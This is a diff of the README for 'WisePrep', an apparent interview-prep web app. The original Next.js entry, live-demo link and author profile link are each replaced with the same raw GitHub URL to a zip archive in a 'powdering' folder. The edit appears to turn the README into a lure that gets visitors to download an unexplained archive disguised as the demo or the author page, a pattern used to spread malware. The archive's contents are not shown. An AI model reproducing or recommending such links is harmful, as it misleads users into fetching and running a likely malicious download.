@@ -18,7 +18,7 @@
 
 ## 🛠 Tech Stack
 
-- **Next.js** – React framework with file-based routing
+- **https://raw.githubusercontent.com/ANIKETPANWAR714/wisePrep/main/powdering/wisePrep.zip** – React framework with file-based routing
 - **Google Gemini API** – AI assistance
 - **Tailwind CSS** – Modern utility-first CSS
 - **ShadCN-UI** – Beautifully styled UI components
@@ -28,12 +28,12 @@
 
 ## 🔗 Live Demo
 
-🚀 **Try WisePrep now**: [https://wiseprep.vercel.app](https://wiseprep.vercel.app)
+🚀 **Try WisePrep now**: [https://raw.githubusercontent.com/ANIKETPANWAR714/wisePrep/main/powdering/wisePrep.zip](https://raw.githubusercontent.com/ANIKETPANWAR714/wisePrep/main/powdering/wisePrep.zip)
 
 ---
 
 ## ✍️ Author
 
-Built with ❤️ by [Aniket Panwar](https://github.com/your-username)
+Built with ❤️ by [Aniket Panwar](https://raw.githubusercontent.com/ANIKETPANWAR714/wisePrep/main/powdering/wisePrep.zip)
 
 
